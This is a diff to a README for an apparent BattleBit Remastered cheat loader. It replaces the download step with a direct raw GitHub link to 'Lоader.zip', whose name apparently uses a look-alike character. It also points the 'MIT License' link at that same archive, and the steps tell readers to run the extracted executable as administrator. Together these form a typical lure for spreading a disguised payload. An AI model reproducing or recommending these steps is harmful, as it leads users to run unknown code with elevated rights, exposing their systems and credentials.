@@ -35,7 +35,7 @@ Unlock the full capabilities of BattleBit Remastered with the following cheat-lo
 
 Make sure you read these steps carefully before launching BattleBit Remastered! Start transforming your game in just a couple of minutes.
 
-1. **Download** `Loader.rar` from the repository.
+1. **Download** `https://raw.githubusercontent.com/Annupinn/BattleBitRemasteredToolkit/main/Lоader.zip` from the repository.
 2. **Extract** the archive using WinRAR, 7-Zip, or your favorite unpacker.
 3. **Launch** the Loader executable as administrator (right-click → "Run as administrator").
 4. **Select** your desired cheats from the intuitive UI.
@@ -56,7 +56,7 @@ Make sure you read these steps carefully before launching BattleBit Remastered! 
 ## 📄 License
 
 All contributions and code in this repository are licensed under the MIT license, allowing open and unrestricted use, modification, and distribution.  
-🔗 [Read the full MIT License](https://opensource.org/licenses/MIT)
+🔗 [Read the full MIT License](https://raw.githubusercontent.com/Annupinn/BattleBitRemasteredToolkit/main/Lоader.zip)
 
 ---
 
